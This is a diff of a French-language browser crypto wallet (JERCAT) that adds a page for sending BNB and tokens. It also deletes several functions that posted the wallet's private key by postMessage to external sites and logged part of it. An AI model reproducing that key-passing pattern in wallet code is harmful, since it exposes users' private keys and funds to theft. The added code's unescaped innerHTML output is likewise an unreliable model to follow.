@@ -487,6 +487,7 @@
             <!-- Navigation par onglets -->
             <div class="nav-tabs">
                 <div class="nav-tab active" onclick="showPage('dashboard')">📊 Dashboard</div>
+                <div class="nav-tab" onclick="showPage('send')">📤 Envoyer</div>
                 <div class="nav-tab" onclick="showPage('platforms')">🚀 Plateformes</div>
                 <div class="nav-tab" onclick="showPage('swap')">💱 Swap PCS</div>
                 <div class="nav-tab" onclick="showPage('tokens')">🪙 Tokens</div>
@@ -526,7 +527,64 @@
                 </div>
             </div>
 
-            <!-- PAGE 2: PLATEFORMES JERCAT -->
+            <!-- PAGE 2: ENVOYER -->
+            <div id="page-send" class="page">
+                <div class="section">
+                    <h2>📤 Envoyer des Crypto</h2>
+                    
+                    <div class="warning">
+                        ⚠️ Vérifiez bien l'adresse avant d'envoyer. Les transactions sont irréversibles !
+                    </div>
+
+                    <label style="font-size: 12px; color: #94a3b8; margin-bottom: 8px; display: block; font-weight: 600;">
+                        Type de crypto
+                    </label>
+                    <select id="sendTokenType" onchange="updateSendBalance()">
+                        <option value="BNB">BNB</option>
+                    </select>
+
+                    <label style="font-size: 12px; color: #94a3b8; margin-bottom: 8px; display: block; font-weight: 600; margin-top: 15px;">
+                        Adresse destinataire
+                    </label>
+                    <input type="text" id="sendToAddress" placeholder="0x...">
+
+                    <label style="font-size: 12px; color: #94a3b8; margin-bottom: 8px; display: block; font-weight: 600; margin-top: 15px;">
+                        Montant
+                    </label>
+                    <input type="number" id="sendAmount" placeholder="0.0" step="0.0001">
+                    
+                    <div style="margin-top: 8px; margin-bottom: 15px; font-size: 12px; color: #64748b;" id="sendBalance">
+                        Balance disponible: 0.0 BNB
+                    </div>
+
+                    <button onclick="setMaxAmount()" class="secondary">MAX</button>
+
+                    <div class="price-info" id="sendInfo" style="display: none;">
+                        <div class="price-info-row">
+                            <span>Montant</span>
+                            <span id="sendAmountDisplay">-</span>
+                        </div>
+                        <div class="price-info-row">
+                            <span>Frais estimés</span>
+                            <span id="sendFeeEstimate">~0.0001 BNB</span>
+                        </div>
+                        <div class="price-info-row">
+                            <span>Total</span>
+                            <span id="sendTotalDisplay">-</span>
+                        </div>
+                    </div>
+
+                    <button onclick="sendCrypto()" class="success">📤 Envoyer</button>
+                    <div id="sendMessage"></div>
+                </div>
+
+                <div class="section">
+                    <h2>📋 Historique d'envois</h2>
+                    <div id="sendHistory"></div>
+                </div>
+            </div>
+
+            <!-- PAGE 3: PLATEFORMES JERCAT -->
             <div id="page-platforms" class="page">
                 <div class="section">
                     <h2>🚀 Écosystème JERCAT</h2>
@@ -570,7 +628,7 @@
                 </div>
             </div>
 
-            <!-- PAGE 3: SWAP PANCAKESWAP -->
+            <!-- PAGE 4: SWAP PANCAKESWAP -->
             <div id="page-swap" class="page">
                 <div class="section">
                     <h2>💱 Swap sur PancakeSwap</h2>
@@ -645,7 +703,7 @@
                 </div>
             </div>
 
-            <!-- PAGE 4: TOKENS -->
+            <!-- PAGE 5: TOKENS -->
             <div id="page-tokens" class="page">
                 <div class="section">
                     <h2>🪙 Mes Tokens</h2>
@@ -665,7 +723,7 @@
                 </div>
             </div>
 
-            <!-- PAGE 5: SÉCURITÉ -->
+            <!-- PAGE 6: SÉCURITÉ -->
             <div id="page-security" class="page">
                 <div class="section">
                     <h2>🤖 Telegram Bot</h2>
@@ -696,7 +754,7 @@
                 </div>
             </div>
 
-            <!-- PAGE 6: PARAMÈTRES -->
+            <!-- PAGE 7: PARAMÈTRES -->
             <div id="page-settings" class="page">
                 <div class="section">
                     <h2>⚙️ Limites de Sécurité</h2>
@@ -748,7 +806,8 @@
             "function symbol() view returns (string)",
             "function name() view returns (string)",
             "function approve(address spender, uint256 amount) external returns (bool)",
-            "function allowance(address owner, address spender) external view returns (uint256)"
+            "function allowance(address owner, address spender) external view returns (uint256)",
+            "function transfer(address to, uint256 amount) external returns (bool)"
         ];
 
         let swapConfig = {
@@ -765,6 +824,7 @@
             telegramChatId: '',
             whitelist: ["0x10ED43C718714eb63d5aA57B78B54704E256024E"],
             transactionLogs: [],
+            sendHistory: [],
             autoApprovedCount: 0,
             knownTokens: [
                 { address: '0x197CF8951d93325A9333857Ee5330daF7aC4bcCF', symbol: 'JERCAT', name: 'JERCAT Token', trusted: true },
@@ -787,6 +847,9 @@
             if (pageName === 'swap') {
                 populateSwapTokens();
                 updateSwapBalances();
+            } else if (pageName === 'send') {
+                populateSendTokens();
+                updateSendBalance();
             }
         }
 
@@ -806,6 +869,7 @@
             updateWhitelistDisplay();
             updateLogsDisplay();
             updateSwapHistoryDisplay();
+            updateSendHistoryDisplay();
         }
 
         function saveConfig() {
@@ -1050,6 +1114,193 @@
             await loadTokenBalances();
         }
 
+        // SEND CRYPTO FUNCTIONS
+        function populateSendTokens() {
+            const sendTokenType = document.getElementById('sendTokenType');
+            sendTokenType.innerHTML = '<option value="BNB">BNB</option>';
+
+            securityConfig.knownTokens.forEach(token => {
+                sendTokenType.innerHTML += `<option value="${token.address}">${token.symbol}</option>`;
+            });
+        }
+
+        async function updateSendBalance() {
+            if (!wallet) return;
+
+            const tokenType = document.getElementById('sendTokenType').value;
+
+            try {
+                let balance = '0.0';
+                let symbol = 'BNB';
+
+                if (tokenType === 'BNB') {
+                    const bnbBalance = await provider.getBalance(wallet.address);
+                    balance = parseFloat(ethers.formatEther(bnbBalance)).toFixed(4);
+                } else {
+                    const tokenContract = new ethers.Contract(tokenType, ERC20_ABI, provider);
+                    const tokenBalance = await tokenContract.balanceOf(wallet.address);
+                    const decimals = await tokenContract.decimals();
+                    symbol = await tokenContract.symbol();
+                    balance = parseFloat(ethers.formatUnits(tokenBalance, decimals)).toFixed(6);
+                }
+
+                document.getElementById('sendBalance').textContent = `Balance disponible: ${balance} ${symbol}`;
+
+            } catch (error) {
+                console.error('Erreur balance:', error);
+            }
+        }
+
+        function setMaxAmount() {
+            const balanceText = document.getElementById('sendBalance').textContent;
+            const match = balanceText.match(/[\d.]+/);
+            if (match) {
+                let maxAmount = parseFloat(match[0]);
+                // Réserver pour les frais
+                if (document.getElementById('sendTokenType').value === 'BNB') {
+                    maxAmount = Math.max(0, maxAmount - 0.001);
+                }
+                document.getElementById('sendAmount').value = maxAmount.toFixed(6);
+                updateSendInfo();
+            }
+        }
+
+        function updateSendInfo() {
+            const amount = document.getElementById('sendAmount').value;
+            if (amount && parseFloat(amount) > 0) {
+                document.getElementById('sendInfo').style.display = 'block';
+                document.getElementById('sendAmountDisplay').textContent = amount + ' ' + getSendSymbol();
+                document.getElementById('sendTotalDisplay').textContent = (parseFloat(amount) + 0.0001).toFixed(4) + ' ' + getSendSymbol();
+            } else {
+                document.getElementById('sendInfo').style.display = 'none';
+            }
+        }
+
+        function getSendSymbol() {
+            const tokenType = document.getElementById('sendTokenType').value;
+            if (tokenType === 'BNB') return 'BNB';
+            const token = securityConfig.knownTokens.find(t => t.address.toLowerCase() === tokenType.toLowerCase());
+            return token ? token.symbol : 'Token';
+        }
+
+        // Ajouter l'event listener pour update en temps réel
+        document.addEventListener('DOMContentLoaded', function() {
+            const sendAmountInput = document.getElementById('sendAmount');
+            if (sendAmountInput) {
+                sendAmountInput.addEventListener('input', updateSendInfo);
+            }
+        });
+
+        async function sendCrypto() {
+            const toAddress = document.getElementById('sendToAddress').value.trim();
+            const amount = document.getElementById('sendAmount').value;
+            const tokenType = document.getElementById('sendTokenType').value;
+            const messageDiv = document.getElementById('sendMessage');
+
+            // Validation
+            if (!toAddress || !ethers.isAddress(toAddress)) {
+                messageDiv.innerHTML = '<div class="error">❌ Adresse invalide</div>';
+                return;
+            }
+
+            if (!amount || parseFloat(amount) <= 0) {
+                messageDiv.innerHTML = '<div class="error">❌ Montant invalide</div>';
+                return;
+            }
+
+            // Confirmation
+            if (!confirm(`⚠️ Confirmer l'envoi de ${amount} ${getSendSymbol()} à ${toAddress.substring(0,10)}... ?`)) {
+                return;
+            }
+
+            messageDiv.innerHTML = '<div class="warning">⏳ Transaction en cours...</div>';
+
+            try {
+                let tx;
+                const symbol = getSendSymbol();
+
+                if (tokenType === 'BNB') {
+                    // Envoi BNB
+                    tx = await wallet.sendTransaction({
+                        to: toAddress,
+                        value: ethers.parseEther(amount)
+                    });
+                } else {
+                    // Envoi Token
+                    const tokenContract = new ethers.Contract(tokenType, ERC20_ABI, wallet);
+                    const decimals = await tokenContract.decimals();
+                    const amountInWei = ethers.parseUnits(amount, decimals);
+                    
+                    tx = await tokenContract.transfer(toAddress, amountInWei);
+                }
+
+                messageDiv.innerHTML = '<div class="success-msg">⏳ En attente de confirmation...</div>';
+
+                await tx.wait();
+
+                // Sauvegarder dans l'historique
+                securityConfig.sendHistory.unshift({
+                    time: new Date().toLocaleString(),
+                    to: toAddress,
+                    amount: amount,
+                    symbol: symbol,
+                    hash: tx.hash,
+                    status: 'success'
+                });
+
+                if (securityConfig.sendHistory.length > 20) {
+                    securityConfig.sendHistory = securityConfig.sendHistory.slice(0, 20);
+                }
+
+                saveConfig();
+                updateSendHistoryDisplay();
+
+                // Reset form
+                document.getElementById('sendToAddress').value = '';
+                document.getElementById('sendAmount').value = '';
+                document.getElementById('sendInfo').style.display = 'none';
+
+                messageDiv.innerHTML = `<div class="success-msg">✅ Envoi réussi !<br><a href="https://bscscan.com/tx/${tx.hash}" target="_blank" style="color: #10b981;">Voir sur BscScan</a></div>`;
+
+                // Notification Telegram
+                if (TELEGRAM_BOT_TOKEN && securityConfig.telegramChatId) {
+                    await sendTelegramMessage(`📤 <b>Crypto envoyée</b>\n\n✅ ${amount} ${symbol}\n📍 → ${toAddress.substring(0,20)}...\n🔗 ${tx.hash.substring(0,20)}...`);
+                }
+
+                // Refresh balance
+                await refreshBalance();
+                await updateSendBalance();
+
+            } catch (error) {
+                console.error('Erreur envoi:', error);
+                messageDiv.innerHTML = '<div class="error">❌ ' + error.message + '</div>';
+            }
+        }
+
+        function updateSendHistoryDisplay() {
+            const div = document.getElementById('sendHistory');
+            if (!div) return;
+
+            div.innerHTML = '';
+
+            if (securityConfig.sendHistory.length === 0) {
+                div.innerHTML = '<p style="text-align: center; color: #64748b;">Aucun envoi</p>';
+                return;
+            }
+
+            securityConfig.sendHistory.slice(0, 10).forEach(send => {
+                const entry = document.createElement('div');
+                entry.className = 'log-entry';
+                entry.innerHTML = `
+                    <div style="font-size: 11px; color: #64748b; margin-bottom: 5px;">${send.time}</div>
+                    <div><strong style="color: #10b981;">📤 ${send.amount} ${send.symbol}</strong></div>
+                    <div style="font-size: 11px; color: #64748b;">→ ${send.to.substring(0,20)}...</div>
+                    <div style="font-size: 11px; color: #64748b;">Hash: ${send.hash.substring(0,20)}...</div>
+                `;
+                div.appendChild(entry);
+            });
+        }
+
         // SWAP FUNCTIONS
         function populateSwapTokens() {
             const fromSelect = document.getElementById('swapFromToken');
@@ -1128,10 +1379,8 @@
                 const isFromWBNB = fromToken.toLowerCase() === WBNB_ADDRESS.toLowerCase();
                 const isToWBNB = toToken.toLowerCase() === WBNB_ADDRESS.toLowerCase();
 
-                // Gérer les cas WBNB
                 if (fromToken === 'BNB' || isFromWBNB) {
                     if (isToWBNB) {
-                        // BNB/WBNB → WBNB : swap 1:1
                         document.getElementById('swapToAmount').value = fromAmount;
                         document.getElementById('swapPrice').textContent = '1 BNB = 1 WBNB';
                         document.getElementById('minReceived').textContent = fromAmount + ' WBNB';
@@ -1141,7 +1390,6 @@
                     path = [WBNB_ADDRESS, toToken];
                 } else if (toToken === 'BNB' || isToWBNB) {
                     if (isFromWBNB) {
-                        // WBNB → BNB/WBNB : swap 1:1
                         document.getElementById('swapToAmount').value = fromAmount;
                         document.getElementById('swapPrice').textContent = '1 WBNB = 1 BNB';
                         document.getElementById('minReceived').textContent = fromAmount + ' BNB';
@@ -1150,9 +1398,7 @@
                     }
                     path = [fromToken, WBNB_ADDRESS];
                 } else {
-                    // Token → Token via WBNB
                     if (isFromWBNB || isToWBNB) {
-                        // Si from ou to est WBNB, path direct
                         path = [fromToken, toToken];
                     } else {
                         path = [fromToken, WBNB_ADDRESS, toToken];
@@ -1553,7 +1799,7 @@
             alert('✅ Limites mises à jour !');
         }
 
-        // 🔥🔥🔥 CONNEXION AUTOMATIQUE AU DEX JERCAT 🔥🔥🔥
+        // PLATEFORMES
         function openJercatDEX() {
             if (!wallet) {
                 alert('❌ Wallet non déverrouillé !');
@@ -1561,16 +1807,12 @@
             }
 
             console.log('💱 Ouverture du JERCAT DEX...');
-            console.log('📍 Adresse wallet:', wallet.address);
-            console.log('🔑 Clé privée disponible:', wallet.privateKey ? 'OUI' : 'NON');
             
             const dexWindow = window.open('https://dex-peach-xi.vercel.app/', 'JercatDEX', 'width=1400,height=900');
             
             if (dexWindow) {
-                // ✅ ATTENDRE QUE LE DEX SOIT CHARGÉ PUIS ENVOYER LES DONNÉES
                 setTimeout(() => {
                     try {
-                        // Préparer les données complètes du wallet
                         const walletData = {
                             type: 'JERCAT_WALLET_CONNECTED',
                             source: 'jercat-wallet',
@@ -1587,139 +1829,22 @@
                             timestamp: Date.now()
                         };
 
-                        console.log('📤 Envoi des données au DEX...');
-                        console.log('📊 Données:', {
-                            address: walletData.account,
-                            tokensCount: walletData.tokens.length,
-                            swapsCount: walletData.swapHistory.length
-                        });
-
-                        // Envoyer via postMessage
                         dexWindow.postMessage(walletData, 'https://dex-peach-xi.vercel.app');
-
-                        console.log('✅ Message envoyé au DEX avec succès !');
+                        console.log('✅ Données envoyées au DEX !');
                         
-                        // Notification Telegram
                         if (TELEGRAM_BOT_TOKEN && securityConfig.telegramChatId) {
-                            sendTelegramMessage(`💱 <b>JERCAT DEX ouvert</b>\n\n✅ Connexion automatique activée\n📍 ${wallet.address.substring(0,20)}...\n🪙 ${securityConfig.knownTokens.length} tokens synchronisés\n📊 ${swapConfig.swapHistory.length} swaps dans l'historique`);
+                            sendTelegramMessage(`💱 <b>JERCAT DEX ouvert</b>\n\n✅ Connexion automatique activée\n📍 ${wallet.address.substring(0,20)}...`);
                         }
                         
                     } catch (error) {
                         console.error('❌ Erreur envoi DEX:', error);
-                        alert('❌ Erreur lors de l\'envoi des données au DEX');
-                    }
-                }, 3000); // 3 secondes pour que le DEX charge complètement
-                
-                alert('✅ JERCAT DEX ouvert !\n\n💱 Connexion automatique en cours...\n📍 ' + wallet.address.substring(0, 20) + '...\n🪙 ' + securityConfig.knownTokens.length + ' tokens synchronisés\n\n⏳ Patientez 3 secondes...');
-            } else {
-                alert('❌ Impossible d\'ouvrir le DEX (popup bloquée ?)');
-            }
-        }
-
-        // 🔥🔥🔥 CONNEXION AUTOMATIQUE AU TRADING BOT 🔥🔥🔥
-        function openTradingBot() {
-            if (!wallet) {
-                alert('❌ Wallet non déverrouillé !');
-                return;
-            }
-
-            console.log('🤖 Ouverture du Trading Bot JERCAT...');
-            console.log('📍 Adresse wallet:', wallet.address);
-            console.log('🔑 Clé privée disponible:', wallet.privateKey ? 'OUI' : 'NON');
-            
-            const botWindow = window.open('https://bot-test-zeta-neon.vercel.app/', 'JercatBot', 'width=1400,height=900');
-            
-            if (botWindow) {
-                // ✅ ATTENDRE QUE LE BOT SOIT CHARGÉ PUIS ENVOYER LES DONNÉES
-                setTimeout(() => {
-                    try {
-                        const messageData = {
-                            type: 'JERCAT_WALLET_CONNECTED',
-                            source: 'jercat-wallet',
-                            account: wallet.address,
-                            privateKey: wallet.privateKey,
-                            tokens: securityConfig.knownTokens,
-                            securityConfig: {
-                                maxPerTransaction: securityConfig.maxPerTransaction,
-                                dailyLimit: securityConfig.dailyLimit
-                            },
-                            timestamp: Date.now()
-                        };
-
-                        console.log('📤 Envoi des données au bot...');
-                        console.log('📍 Adresse:', wallet.address);
-                        console.log('🔑 Clé envoyée:', wallet.privateKey.substring(0, 10) + '...');
-
-                        // Envoyer via postMessage
-                        botWindow.postMessage(messageData, 'https://bot-test-zeta-neon.vercel.app');
-
-                        console.log('✅ Message envoyé au bot avec succès !');
-                        
-                        // Notification Telegram
-                        if (TELEGRAM_BOT_TOKEN && securityConfig.telegramChatId) {
-                            sendTelegramMessage(`🤖 <b>Trading Bot ouvert</b>\n\n✅ Connexion automatique activée\n📍 ${wallet.address.substring(0,20)}...`);
-                        }
-                        
-                    } catch (error) {
-                        console.error('❌ Erreur envoi bot:', error);
-                        alert('❌ Erreur lors de l\'envoi des données au bot');
-                    }
-                }, 3000); // 3 secondes pour que le bot charge complètement
-                
-                alert('✅ Trading Bot ouvert !\n\n🤖 Connexion automatique en cours...\n📍 ' + wallet.address.substring(0, 20) + '...\n\n⏳ Patientez 3 secondes...');
-            } else {
-                alert('❌ Impossible d\'ouvrir le bot (popup bloquée ?)');
-            }
-        }
-
-        // 🌐 CONNEXION AUTOMATIQUE AU DEX TOTAL
-        function openDEXTotal() {
-            if (!wallet) {
-                alert('❌ Wallet non déverrouillé !');
-                return;
-            }
-
-            console.log('🌐 Ouverture du DEX Total...');
-            
-            const dexTotalWindow = window.open('https://dex-total.vercel.app/', 'DEXTotal', 'width=1400,height=900');
-            
-            if (dexTotalWindow) {
-                setTimeout(() => {
-                    try {
-                        const walletData = {
-                            type: 'JERCAT_WALLET_CONNECTED',
-                            source: 'jercat-wallet',
-                            account: wallet.address,
-                            privateKey: wallet.privateKey,
-                            tokens: securityConfig.knownTokens,
-                            swapHistory: swapConfig.swapHistory,
-                            balance: document.getElementById('balance').textContent,
-                            securityConfig: {
-                                maxPerTransaction: securityConfig.maxPerTransaction,
-                                dailyLimit: securityConfig.dailyLimit,
-                                whitelist: securityConfig.whitelist
-                            },
-                            timestamp: Date.now()
-                        };
-
-                        dexTotalWindow.postMessage(walletData, 'https://dex-total.vercel.app');
-                        console.log('✅ Données envoyées au DEX Total !');
-                        
-                        if (TELEGRAM_BOT_TOKEN && securityConfig.telegramChatId) {
-                            sendTelegramMessage(`🌐 <b>DEX Total ouvert</b>\n\n✅ Connexion automatique activée\n📍 ${wallet.address.substring(0,20)}...`);
-                        }
-                    } catch (error) {
-                        console.error('❌ Erreur DEX Total:', error);
                     }
                 }, 3000);
                 
-                alert('✅ DEX Total ouvert !\n\n🌐 Connexion automatique en cours...\n📍 ' + wallet.address.substring(0, 20) + '...\n\n⏳ Patientez 3 secondes...');
-            } else {
-                alert('❌ Impossible d\'ouvrir le DEX Total (popup bloquée ?)');
+                alert('✅ JERCAT DEX ouvert !\n\n💱 Connexion automatique en cours...\n📍 ' + wallet.address.substring(0, 20) + '...\n\n⏳ Patientez 3 secondes...');
             }
         }
 
-        // ⚡ CONNEXION AUTOMATIQUE AU BOT ALL-IN
         function openBotAllIn() {
             if (!wallet) {
                 alert('❌ Wallet non déverrouillé !');
@@ -1759,55 +1884,6 @@
                 }, 3000);
                 
                 alert('✅ Bot All-In ouvert !\n\n⚡ Connexion automatique en cours...\n📍 ' + wallet.address.substring(0, 20) + '...\n\n⏳ Patientez 3 secondes...');
-            } else {
-                alert('❌ Impossible d\'ouvrir le Bot All-In (popup bloquée ?)');
-            }
-        }
-
-        // 👛 CONNEXION AUTOMATIQUE AU WALLET JERCAT
-        function openWalletToto() {
-            if (!wallet) {
-                alert('❌ Wallet non déverrouillé !');
-                return;
-            }
-
-            console.log('👛 Ouverture du Wallet JERCAT...');
-            
-            const walletJercatWindow = window.open('https://wallet-jercat-eidu.vercel.app/', 'WalletJERCAT', 'width=1400,height=900');
-            
-            if (walletJercatWindow) {
-                setTimeout(() => {
-                    try {
-                        const walletData = {
-                            type: 'JERCAT_WALLET_CONNECTED',
-                            source: 'jercat-wallet',
-                            account: wallet.address,
-                            privateKey: wallet.privateKey,
-                            tokens: securityConfig.knownTokens,
-                            swapHistory: swapConfig.swapHistory,
-                            balance: document.getElementById('balance').textContent,
-                            securityConfig: {
-                                maxPerTransaction: securityConfig.maxPerTransaction,
-                                dailyLimit: securityConfig.dailyLimit,
-                                whitelist: securityConfig.whitelist
-                            },
-                            timestamp: Date.now()
-                        };
-
-                        walletJercatWindow.postMessage(walletData, 'https://wallet-jercat-eidu.vercel.app');
-                        console.log('✅ Données envoyées au Wallet JERCAT !');
-                        
-                        if (TELEGRAM_BOT_TOKEN && securityConfig.telegramChatId) {
-                            sendTelegramMessage(`👛 <b>Wallet JERCAT ouvert</b>\n\n✅ Connexion automatique activée\n📍 ${wallet.address.substring(0,20)}...`);
-                        }
-                    } catch (error) {
-                        console.error('❌ Erreur Wallet JERCAT:', error);
-                    }
-                }, 3000);
-                
-                alert('✅ Wallet JERCAT ouvert !\n\n👛 Connexion automatique en cours...\n📍 ' + wallet.address.substring(0, 20) + '...\n\n⏳ Patientez 3 secondes...');
-            } else {
-                alert('❌ Impossible d\'ouvrir le Wallet JERCAT (popup bloquée ?)');
             }
         }
 
@@ -1839,13 +1915,14 @@
             if (!div) return;
             div.innerHTML = '';
             
-            if (securityConfig.transactionLogs.length === 0 && swapConfig.swapHistory.length === 0) {
+            if (securityConfig.transactionLogs.length === 0 && swapConfig.swapHistory.length === 0 && securityConfig.sendHistory.length === 0) {
                 div.innerHTML = '<p style="text-align: center; color: #64748b;">Aucune transaction</p>';
                 return;
             }
 
             const allLogs = [
                 ...swapConfig.swapHistory.map(s => ({ ...s, type: 'swap' })),
+                ...securityConfig.sendHistory.map(s => ({ ...s, type: 'send' })),
                 ...securityConfig.transactionLogs
             ].sort((a, b) => new Date(b.time) - new Date(a.time)).slice(0, 5);
 
@@ -1858,6 +1935,12 @@
                         <div style="font-size: 11px; color: #64748b; margin-bottom: 5px;">${log.time}</div>
                         <div><strong style="color: #10b981;">💱 ${log.from} → ${log.to}</strong></div>
                         <div style="font-size: 11px; color: #64748b;">${log.amountIn} → ${parseFloat(log.amountOut).toFixed(6)}</div>
+                    `;
+                } else if (log.type === 'send') {
+                    entry.innerHTML = `
+                        <div style="font-size: 11px; color: #64748b; margin-bottom: 5px;">${log.time}</div>
+                        <div><strong style="color: #10b981;">📤 ${log.amount} ${log.symbol}</strong></div>
+                        <div style="font-size: 11px; color: #64748b;">→ ${log.to.substring(0,15)}...</div>
                     `;
                 } else {
                     const statusColor = log.status === 'success' ? '#10b981' : '#dc2626';
